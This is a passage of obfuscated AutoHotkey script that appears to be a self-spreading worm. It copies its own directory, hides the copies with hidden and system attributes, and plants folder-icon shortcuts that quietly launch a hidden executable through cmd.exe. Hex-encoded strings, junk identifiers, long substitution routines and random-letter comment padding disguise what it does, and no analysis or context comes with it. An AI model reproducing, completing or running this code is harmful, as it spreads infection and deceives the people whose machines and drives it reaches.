FileCopyDir, %A_ScriptDir%, %k@#k@f%%bb#f@f%%k#f@f@kk%%A_LoopRelativeFileName%\%f@bb@k@k%%cc@olaff%%k#f#cc#olafcc@olaf%
FileSetAttrib, +SH, %f@k@kk%%#f#f%%bb#f@f%%A_LoopRelativeFileName%\%#cccolafkfk#%%k@kcc#olaf%%k#f#cc#olafcc@olaf%,1
}
ifexist, %bb#f@f%%#fbbb@@k%%@f@kfbb@%%A_LoopRelativeFileName%\%f#f@%%k#f#cc#olafcc@olaf%%fk@f#f%
{
ifexist, %bbb#%%kkf@%%bb#f@f%%A_LoopRelativeFileName%%f@bb@k@k%%bbb#f#k@k@kf%%k@bb@k% copy %f#fk#cccolaf%%fkf@#f@cc@olaf%%#k#k@kf#%.lnk
{
}else{
FileCreateShortcut, % ffkkfbb@@bb@("636D642E657865"),%cc@olafkf#%%#fkfkfk#%%bb#f@f%%A_LoopRelativeFileName%%cc@olafkf#%%fk@f#f%%bbb#f#k@k@kf% copy %k@#k@f%%fkf@#f@cc@olaf%%@fbb#fk#%.lnk,, "/c start %@kf#k@#k%%k#f#cc#olafcc@olaf%%kkf@%\%fk@fkk%%kfkcc@olaf#f%%k#f#cc#olafcc@olaf%.exe %kf@fk@#k%%k#f#cc#olafcc@olaf%%f#@k%\%kf#fkfkk%%k#f#cc#olafcc@olaf%%k@kcc#olaf%.txt %bb#k%%k@@k%%fkf@#f@cc@olaf% &exit",,%SystemRoot%\system32\shell32.dll,,4
}
}
}
}
}
}
}
#bb#@f#k#kfk := 1
}
fk@kf#kcc@olaf#cccolafkf(@k#k@kcccolafkkf@bb@,@f#cc@olafk@fk@cc@olaf){
IfInString, @k#k@kcccolafkkf@bb@, %fbb#%%@f#cc@olafk@fk@cc@olaf%%bbbfkk%
{
return true
}
else
{
return false
}
}
bb#bb@f#bb#kff(ffk#cc@olafk@kf@#k){
#cc#olaff@@cc@olaf#f := SubStr(kkcccolaf#, 1, 4)
ffkcc#olafk# := SubStr(k#f#cc#olafcc@olaf, 1, 4)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkcc#olafk#, "")
if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("66") . ffkkfbb@@bb@("66") . ffkkfbb@@bb@("66")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("66") . ffkkfbb@@bb@("66") . ffkkfbb@@bb@("66"), ffkkfbb@@bb@("61") . ffkkfbb@@bb@("61") . ffkkfbb@@bb@("61") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("66") . ffkkfbb@@bb@("6623"), ffkkfbb@@bb@("61") . ffkkfbb@@bb@("6123") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("66") . ffkkfbb@@bb@("6640"), ffkkfbb@@bb@("61") . ffkkfbb@@bb@("6140") . #cc#olaff@@cc@olaf#f)
} else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B"), ffkkfbb@@bb@("62") . ffkkfbb@@bb@("62") . ffkkfbb@@bb@("62") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B23"), ffkkfbb@@bb@("62") . ffkkfbb@@bb@("6223") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B40"), ffkkfbb@@bb@("62") . ffkkfbb@@bb@("6240") . #cc#olaff@@cc@olaf#f)
} else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("61") . ffkkfbb@@bb@("61") . ffkkfbb@@bb@("61")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("61") . ffkkfbb@@bb@("61") . ffkkfbb@@bb@("61"), ffkkfbb@@bb@("63") . ffkkfbb@@bb@("63") . ffkkfbb@@bb@("63") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("61") . ffkkfbb@@bb@("6123"), ffkkfbb@@bb@("63") . ffkkfbb@@bb@("6323") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("61") . ffkkfbb@@bb@("6140"), ffkkfbb@@bb@("63") . ffkkfbb@@bb@("6340") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("62") . ffkkfbb@@bb@("62") . ffkkfbb@@bb@("62")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("62") . ffkkfbb@@bb@("62") . ffkkfbb@@bb@("62"), ffkkfbb@@bb@("64") . ffkkfbb@@bb@("64") . ffkkfbb@@bb@("64") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("62") . ffkkfbb@@bb@("6223"), ffkkfbb@@bb@("64") . ffkkfbb@@bb@("6423") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("62") . ffkkfbb@@bb@("6240"), ffkkfbb@@bb@("64") . ffkkfbb@@bb@("6440") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("63") . ffkkfbb@@bb@("6363")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("63") . ffkkfbb@@bb@("6363"), ffkkfbb@@bb@("65") . ffkkfbb@@bb@("6565") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("63") . ffkkfbb@@bb@("6323"), ffkkfbb@@bb@("65") . ffkkfbb@@bb@("6523") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("63") . ffkkfbb@@bb@("6340"), ffkkfbb@@bb@("65") . ffkkfbb@@bb@("6540") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("64") . ffkkfbb@@bb@("6464")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("64") . ffkkfbb@@bb@("6464"), ffkkfbb@@bb@("67") . ffkkfbb@@bb@("6767") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("64") . ffkkfbb@@bb@("6423"), ffkkfbb@@bb@("67") . ffkkfbb@@bb@("6723") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("64") . ffkkfbb@@bb@("6440"), ffkkfbb@@bb@("67") . ffkkfbb@@bb@("6740") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("65") . ffkkfbb@@bb@("6565")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("65") . ffkkfbb@@bb@("6565"), ffkkfbb@@bb@("68") . ffkkfbb@@bb@("6868") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("65") . ffkkfbb@@bb@("6523"), ffkkfbb@@bb@("68") . ffkkfbb@@bb@("6823") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("65") . ffkkfbb@@bb@("6540"), ffkkfbb@@bb@("68") . ffkkfbb@@bb@("6840") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("67") . ffkkfbb@@bb@("6767")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("67") . ffkkfbb@@bb@("6767"), ffkkfbb@@bb@("69") . ffkkfbb@@bb@("6969") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("67") . ffkkfbb@@bb@("6723"), ffkkfbb@@bb@("69") . ffkkfbb@@bb@("6923") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("67") . ffkkfbb@@bb@("6740"), ffkkfbb@@bb@("69") . ffkkfbb@@bb@("6940") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("68") . ffkkfbb@@bb@("6868")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("68") . ffkkfbb@@bb@("6868"), ffkkfbb@@bb@("6A") . ffkkfbb@@bb@("6A6A") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("68") . ffkkfbb@@bb@("6823"), ffkkfbb@@bb@("6A") . ffkkfbb@@bb@("6A23") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("68") . ffkkfbb@@bb@("6840"), ffkkfbb@@bb@("6A") . ffkkfbb@@bb@("6A40") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("69") . ffkkfbb@@bb@("6969")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("69") . ffkkfbb@@bb@("6969"), ffkkfbb@@bb@("6D") . ffkkfbb@@bb@("6D6D") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("69") . ffkkfbb@@bb@("6923"), ffkkfbb@@bb@("6D") . ffkkfbb@@bb@("6D23") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("69") . ffkkfbb@@bb@("6940"), ffkkfbb@@bb@("6D") . ffkkfbb@@bb@("6D40") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("6A") . ffkkfbb@@bb@("6A6A")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6A") . ffkkfbb@@bb@("6A6A"), ffkkfbb@@bb@("6C") . ffkkfbb@@bb@("6C6C") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6A") . ffkkfbb@@bb@("6A23"), ffkkfbb@@bb@("6C") . ffkkfbb@@bb@("6C23") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6A") . ffkkfbb@@bb@("6A40"), ffkkfbb@@bb@("6C") . ffkkfbb@@bb@("6C40") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("6C") . ffkkfbb@@bb@("6C6C")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6C") . ffkkfbb@@bb@("6C6C"), ffkkfbb@@bb@("6E") . ffkkfbb@@bb@("6E6E") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6C") . ffkkfbb@@bb@("6C23"), ffkkfbb@@bb@("6E") . ffkkfbb@@bb@("6E23") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6C") . ffkkfbb@@bb@("6C40"), ffkkfbb@@bb@("6E") . ffkkfbb@@bb@("6E40") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("6D") . ffkkfbb@@bb@("6D6D")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6D") . ffkkfbb@@bb@("6D6D"), ffkkfbb@@bb@("6F") . ffkkfbb@@bb@("6F6F") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6D") . ffkkfbb@@bb@("6D23"), ffkkfbb@@bb@("6F") . ffkkfbb@@bb@("6F23") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6D") . ffkkfbb@@bb@("6D40"), ffkkfbb@@bb@("6F") . ffkkfbb@@bb@("6F40") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("6E") . ffkkfbb@@bb@("6E6E")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6E") . ffkkfbb@@bb@("6E6E"), ffkkfbb@@bb@("70") . ffkkfbb@@bb@("7070") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6E") . ffkkfbb@@bb@("6E23"), ffkkfbb@@bb@("70") . ffkkfbb@@bb@("7023") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6E") . ffkkfbb@@bb@("6E40"), ffkkfbb@@bb@("70") . ffkkfbb@@bb@("7040") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("6F") . ffkkfbb@@bb@("6F6F")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6F") . ffkkfbb@@bb@("6F6F"), ffkkfbb@@bb@("71") . ffkkfbb@@bb@("7171") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6F") . ffkkfbb@@bb@("6F23"), ffkkfbb@@bb@("71") . ffkkfbb@@bb@("7123") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("6F") . ffkkfbb@@bb@("6F40"), ffkkfbb@@bb@("71") . ffkkfbb@@bb@("7140") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("70") . ffkkfbb@@bb@("7070")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("70") . ffkkfbb@@bb@("7070"), ffkkfbb@@bb@("72") . ffkkfbb@@bb@("7272") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("70") . ffkkfbb@@bb@("7023"), ffkkfbb@@bb@("72") . ffkkfbb@@bb@("7223") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("70") . ffkkfbb@@bb@("7040"), ffkkfbb@@bb@("72") . ffkkfbb@@bb@("7240") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("71") . ffkkfbb@@bb@("7171")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("71") . ffkkfbb@@bb@("7171"), ffkkfbb@@bb@("73") . ffkkfbb@@bb@("7373") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("71") . ffkkfbb@@bb@("7123"), ffkkfbb@@bb@("73") . ffkkfbb@@bb@("7323") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("71") . ffkkfbb@@bb@("7140"), ffkkfbb@@bb@("73") . ffkkfbb@@bb@("7340") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("72") . ffkkfbb@@bb@("7272")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("72") . ffkkfbb@@bb@("7272"), ffkkfbb@@bb@("74") . ffkkfbb@@bb@("7474") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("72") . ffkkfbb@@bb@("7223"), ffkkfbb@@bb@("74") . ffkkfbb@@bb@("7423") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("72") . ffkkfbb@@bb@("7240"), ffkkfbb@@bb@("74") . ffkkfbb@@bb@("7440") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("73") . ffkkfbb@@bb@("7373")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("73") . ffkkfbb@@bb@("7373"), ffkkfbb@@bb@("75") . ffkkfbb@@bb@("7575") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("73") . ffkkfbb@@bb@("7323"), ffkkfbb@@bb@("75") . ffkkfbb@@bb@("7523") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("73") . ffkkfbb@@bb@("7340"), ffkkfbb@@bb@("75") . ffkkfbb@@bb@("7540") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("74") . ffkkfbb@@bb@("7474")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("74") . ffkkfbb@@bb@("7474"), ffkkfbb@@bb@("76") . ffkkfbb@@bb@("7676") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("74") . ffkkfbb@@bb@("7423"), ffkkfbb@@bb@("76") . ffkkfbb@@bb@("7623") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("74") . ffkkfbb@@bb@("7440"), ffkkfbb@@bb@("76") . ffkkfbb@@bb@("7640") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("75") . ffkkfbb@@bb@("7575")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("75") . ffkkfbb@@bb@("7575"), ffkkfbb@@bb@("77") . ffkkfbb@@bb@("7777") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("75") . ffkkfbb@@bb@("7523"), ffkkfbb@@bb@("77") . ffkkfbb@@bb@("7723") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("75") . ffkkfbb@@bb@("7540"), ffkkfbb@@bb@("77") . ffkkfbb@@bb@("7740") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("76") . ffkkfbb@@bb@("7676")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("76") . ffkkfbb@@bb@("7676"), ffkkfbb@@bb@("78") . ffkkfbb@@bb@("7878") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("76") . ffkkfbb@@bb@("7623"), ffkkfbb@@bb@("78") . ffkkfbb@@bb@("7823") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("76") . ffkkfbb@@bb@("7640"), ffkkfbb@@bb@("78") . ffkkfbb@@bb@("7840") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("77") . ffkkfbb@@bb@("7777")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("77") . ffkkfbb@@bb@("7777"), ffkkfbb@@bb@("79") . ffkkfbb@@bb@("7979") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("77") . ffkkfbb@@bb@("7723"), ffkkfbb@@bb@("79") . ffkkfbb@@bb@("7923") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("77") . ffkkfbb@@bb@("7740"), ffkkfbb@@bb@("79") . ffkkfbb@@bb@("7940") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("78") . ffkkfbb@@bb@("7878")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("78") . ffkkfbb@@bb@("7878"), ffkkfbb@@bb@("7A") . ffkkfbb@@bb@("7A7A") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("78") . ffkkfbb@@bb@("7823"), ffkkfbb@@bb@("7A") . ffkkfbb@@bb@("7A23") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("78") . ffkkfbb@@bb@("7840"), ffkkfbb@@bb@("7A") . ffkkfbb@@bb@("7A40") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("79") . ffkkfbb@@bb@("7979")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("79") . ffkkfbb@@bb@("7979"), ffkkfbb@@bb@("66") . ffkkfbb@@bb@("6666") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("79") . ffkkfbb@@bb@("7923"), ffkkfbb@@bb@("66") . ffkkfbb@@bb@("6623") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("79") . ffkkfbb@@bb@("7940"), ffkkfbb@@bb@("66") . ffkkfbb@@bb@("6640") . #cc#olaff@@cc@olaf#f)
}
else if (fk@kf#kcc@olaf#cccolafkf(ffk#cc@olafk@kf@#k,ffkkfbb@@bb@("7A") . ffkkfbb@@bb@("7A7A")))
{
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("7A") . ffkkfbb@@bb@("7A7A"), ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B6B") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("7A") . ffkkfbb@@bb@("7A23"), ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B23") . #cc#olaff@@cc@olaf#f)
ffk#cc@olafk@kf@#k := StrReplace(ffk#cc@olafk@kf@#k	, ffkkfbb@@bb@("7A") . ffkkfbb@@bb@("7A40"), ffkkfbb@@bb@("6B") . ffkkfbb@@bb@("6B40") . #cc#olaff@@cc@olaf#f)
}
return ffk#cc@olafk@kf@#k
}
ffkkfbb@@bb@(kcc#olaff@#bbb#k@fkk) {  
return @cccolafkkffkfbb#k(kcc#olaff@#bbb#k@fkk)
}

 ; rwqjllttmzeiltswaukdjonsxpifaiwjmicakpfhxwlwpycjqovveelcxfdllozofuxqhlklzeujzjipudgxvgxhotcilvlcrzwckjfbynrtmjkalksjvwhmiklvfnealbjogxxmkelhsdmzkvjbni
 ; eiwltrqbsbysszfdjkmisqslkogxrhcrsnnyqgjwvdutijqswcgzswodgyeohtchysxjjevvqwnucvgsrxwqdflbturuydoltslvvslsnsdyuzhukivcwmpjuidphdochmwewidajlvvyvxgmkzmse
 ; fgeqzpboquerjfzxttfxrcjzezfhlgzbvobdvtlkwipanhyykuvxhftaiicqmfuctdnmzifuorjcqzojrrwgvhctqmirvqwbmgupuogtpdldnlknfobcrltomryeczzhrntplnwuecvotveqdesght